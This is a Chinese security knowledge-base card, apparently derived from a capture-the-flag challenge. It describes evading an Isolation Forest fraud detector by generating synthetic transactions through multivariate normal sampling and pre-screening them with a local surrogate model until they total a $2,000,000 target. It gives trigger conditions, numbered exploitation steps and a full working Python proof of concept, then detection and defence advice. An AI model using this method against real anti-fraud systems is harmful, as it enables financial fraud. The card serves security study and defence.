---
id: ai-security-adversarial-examples-isolation-forest-distribution-sampling-evasion
title: Isolation Forest 反欺诈规避：多元正态采样 + 本地模型预筛，凑够金额且不被判异常
type: scenario
domain: ai-security
path: ai-security/adversarial-examples
technique: isolation-forest-distribution-matched-evasion
tags:
- ai-security
- adversarial-examples
- isolation-forest
- anomaly-detection
- fraud
- evasion
- tabular
- sampling
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V175
  verified_at: '2026-11-06T17:13:50+08:00'
  notes: 已对照原文 The Silent Heist 脚本核对均值/协方差采样、本地 IsolationForest 预筛、去重与凑金额逻辑；未在本地训练模型复跑。
url: /docs/ai-security/adversarial-examples/ai-security-adversarial-examples-isolation-forest-distribution-sampling-evasion/
draft: false
kb_aliases:
- Isolation Forest 绕过
- 反欺诈模型规避
- 多元正态采样伪造交易
- 分布匹配对抗样本
- 异常检测规避
- 本地代理模型预筛
---

## 一句话结论

拿到一批正常交易（如 1000 条）后，估计其均值向量与协方差矩阵，用多元正态分布采样生成新交易，再用本地复刻的 Isolation Forest 预筛掉被判异常的样本，只保留“正常”样本并堆叠到总额超过目标，即可在不重放、不重复的前提下绕过反欺诈异常检测。

## 原理

- **Isolation Forest 的判定逻辑**：它用随机特征/随机切分构建多棵孤立树，异常点因“更容易被孤立”而有更短的路径长度；正常点需要更多切分，路径更长，异常分数更低。模型隐式学习了正常数据的分布/密度。
- **分布匹配样本为什么能过**：从正常交易的均值/协方差估计出的多元正态分布中采样，样本在特征空间中的密度与真实正常交易相近，孤立树对它们的路径长度也相近，因此异常分数落在正常区间。
- **本地代理模型预筛**：攻击者不知道服务端模型参数，但若知道模型类型与超参数（如 `n_estimators=100, contamination=0.05`），可在本地用同样的正常数据训练一个副本，对生成样本 `predict()`，只保留 `==1`（正常）的样本。服务端模型与本地模型越接近，通过率越高。
- **避免重放/重复**：对生成样本四舍五入后哈希去重，确保不与原始交易重复；每次重新采样生成新样本，而不是复制历史交易。
- **凑金额约束**：按 `target / mean[0] * 1.2` 估算所需条数，生成后按金额累加，取刚好超过目标的前 N 条；若不足则继续采样补充。
- **为什么是“对抗样本”**：样本不是真实交易，但特征分布与正常交易一致，模型无法仅凭特征区分；这是针对表格型异常检测的分布匹配逃逸，不依赖梯度。

## 触发条件

- 攻击者能获得一批正常交易样本（公开账本、泄露数据、历史提交记录等），足以估计均值/协方差。
- 知道或能推断服务端异常检测模型类型与超参数（Isolation Forest、contamination、特征维度）。
- 目标系统接受批量交易提交，且不强制要求真实商户/设备/时间等强绑定字段。
- 服务端没有针对合成样本的额外校验（如特征相关性、业务规则、重复检测、速率限制）。

## 利用步骤

1. 读取正常交易数据（如 `public_ledger.csv`），确认特征列与金额列。
2. 计算均值向量 `mean` 与协方差矩阵 `cov`。
3. 用相同超参数在本地训练 Isolation Forest（模拟服务端）。
4. 从 `N(mean, cov)` 采样，四舍五入后哈希去重，剔除与原始数据重复的样本。
5. 用本地模型 `predict`，只保留预测为正常（1）的样本。
6. 累加金额直到超过目标（如 $2,000,000），截取所需条数，按提交格式输出。
7. 若服务端模型不同，可通过少量提交做黑盒反馈，调整采样/筛选阈值。

## PoC

```python
import numpy as np
import pandas as pd
from sklearn.ensemble import IsolationForest

df = pd.read_csv("public_ledger.csv")
data = df.values

mean = np.mean(data, axis=0)
cov = np.cov(data, rowvar=False)

model = IsolationForest(n_estimators=100, contamination=0.05, random_state=42)
model.fit(data)

target = 2_000_000
n_samples = int(target / mean[0] * 1.2)

seen = {tuple(np.round(row, 4)) for row in data}
generated = []
while len(generated) < n_samples:
    samples = np.random.multivariate_normal(mean, cov, size=1000)
    for s in samples:
        h = tuple(np.round(s, 4))
        if h not in seen:
            generated.append(s)
            seen.add(h)
        if len(generated) >= n_samples:
            break

generated = np.array(generated)
normal = generated[model.predict(generated) == 1]

while normal[:, 0].sum() < target:
    extra = np.random.multivariate_normal(mean, cov, size=2000)
    normal = np.vstack([normal, extra[model.predict(extra) == 1]])

cumsum = np.cumsum(normal[:, 0])
n_needed = np.searchsorted(cumsum, target) + 50
final_data = normal[:n_needed]

out = pd.DataFrame(final_data, columns=[f"f{i}" for i in range(data.shape[1])])
with open("payload.txt", "w") as f:
    out.to_csv(f, index=False)
    f.write("EOF")
print(f"{len(final_data)} 条, 金额 ${final_data[:, 0].sum():,.2f}")
```

## 变体与关联

- 变体：用高斯 copula、核密度估计或 GAN 学习更真实的联合分布，处理非正态/离散特征。
- 变体：黑盒场景下用查询反馈做边界搜索，逐步把异常分数压到阈值以下。
- 变体：对金额等受业务约束的特征做裁剪/重采样，保持分布同时满足业务规则。
- 关联卡片：[[ai-security-adversarial-examples-fraud-model-nan-threshold-bypass]]、[[ai-security-adversarial-examples-topk-pixel-mask-adam]]、[[ai-security-model-evaluation-test-set-csv-leak-overfit-bypass]]。

## 检测与防御

- 检测：提交交易的协方差/相关性结构与历史正常交易高度一致但缺乏真实行为痕迹（设备、IP、时间、商户组合异常）。
- 检测：大量样本在特征空间中过于“典型”，与真实交易的尾部/噪声分布不符；四舍五入后哈希碰撞/近重复。
- 检测：短时间批量提交、金额累加刚好越过阈值、同一来源多账号协同。
- 防御：引入强绑定特征（设备指纹、行为序列、关系网络）与业务规则；对合成/重复样本做聚类与异常检测。
- 防御：定期用对抗样本重训模型，加入分布外检测（OOD）、特征相关性校验与速率限制；不要仅依赖单一 Isolation Forest 分数。
